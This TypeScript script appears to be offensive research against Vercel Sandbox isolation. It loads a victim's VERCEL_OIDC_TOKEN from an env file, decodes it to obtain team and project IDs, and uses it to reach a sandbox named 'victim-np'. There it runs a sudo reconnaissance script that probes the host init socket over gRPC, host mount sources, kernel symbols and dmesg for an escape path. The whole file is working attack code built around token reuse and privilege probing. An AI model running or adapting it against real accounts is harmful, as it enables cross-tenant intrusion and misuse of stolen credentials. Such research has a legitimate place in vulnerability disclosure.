import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== whoami ==="
id
echo "=== A. unprivileged read /proc/cmdline ==="
head -c 1500 /proc/cmdline 2>&1; echo ""
echo "=== B. unprivileged read /run/vercel/share ==="
ls -la /run/vercel/share/ 2>&1
echo "=== C. unprivileged connect to init.sock (curl) ==="
printf '\\x00\\x00\\x00\\x00\\x00' > /tmp/empty.msg
timeout 3 curl -s --unix-socket /run/vercel/share/init.sock -o /tmp/o -w "code=%{http_code}\\n" -H 'Content-Type: application/grpc' -H 'TE: trailers' -H 'Content-Length: 5' --data-binary @/tmp/empty.msg "http://localhost/vercel.sandbox.spawn.v1.SpawnService/Ping" 2>&1 | tail -2
head -c 200 /tmp/o 2>/dev/null; echo ""
echo "=== D. unprivileged read host mountinfo (bind sources) ==="
grep -aE "/run/vercel|/volumes|/run/cell" /proc/self/mountinfo 2>&1
echo "=== E. /proc/net/tcp (listeners) ==="
head -5 /proc/net/tcp 2>&1
echo "=== F. dmesg access? ==="
dmesg 2>&1 | head -2
echo "=== G. /proc/kallsyms? ==="
head -3 /proc/kallsyms 2>&1
echo "=== H. /sys/kernel ==="
ls /sys/kernel/ 2>&1 | head -10
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore40.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore40.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
